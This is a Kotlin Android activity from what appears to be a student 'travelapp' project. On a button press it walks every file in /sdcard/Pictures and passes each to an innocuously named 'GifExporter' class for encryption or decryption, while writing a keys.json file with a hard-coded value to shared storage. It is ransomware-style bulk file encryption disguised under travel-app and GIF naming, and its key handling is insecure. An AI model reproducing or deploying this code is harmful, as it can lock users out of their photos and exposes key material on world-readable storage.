package edu.singaporetech.travelapp

import GifExporter
import Locker
import android.content.Context
import android.content.SharedPreferences
import android.os.Build
import android.os.Bundle
import android.preference.PreferenceManager
import android.security.keystore.KeyGenParameterSpec
import android.security.keystore.KeyProperties
import android.util.Base64
import android.util.Log
import android.widget.Button
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import com.google.gson.Gson
import org.json.JSONObject
import java.io.*
import java.lang.Exception
import java.security.Key
import java.security.KeyStore
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.KeyGenerator
import javax.crypto.SecretKey
import javax.crypto.spec.IvParameterSpec

class EncryptFile : AppCompatActivity(){

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onCreate(savedInstanceState: Bundle?){
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_encrypt)

        val encrypt_button: Button = findViewById(R.id.btn_encrypt)
        val decrypt_button: Button = findViewById(R.id.btn_decrypt)

        encrypt_button.setOnClickListener {
            var cipherMode = Cipher.ENCRYPT_MODE.toString()
            main(arrayOf(cipherMode))
        }

        decrypt_button.setOnClickListener {
            var cipherMode = Cipher.DECRYPT_MODE.toString()
            main(arrayOf(cipherMode))
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    fun main(args: Array<String>) {
        if (!File("/sdcard/keys.json").exists()) {
            // Create new empty file to store key.json in /sdcard
            var path = "/sdcard/keys.json"
            var jsonFile = File(path)
            var testKey = path.replace("/", "_")
            var testVal = "ZZHHYYTTUUHHGGRR"
            var jsonObj: JSONObject = JSONObject()
            jsonObj.put(testKey, testVal)
            jsonFile.writeText(jsonObj.toString())
        }
        // Loop through content in dir
        File("/sdcard/Pictures").walk().forEach {
            if (it.toString() != "/sdcard/Pictures") {
                GifExporter.exportGif(args[0].toInt(), it.toString())
            }
        }
    }
}

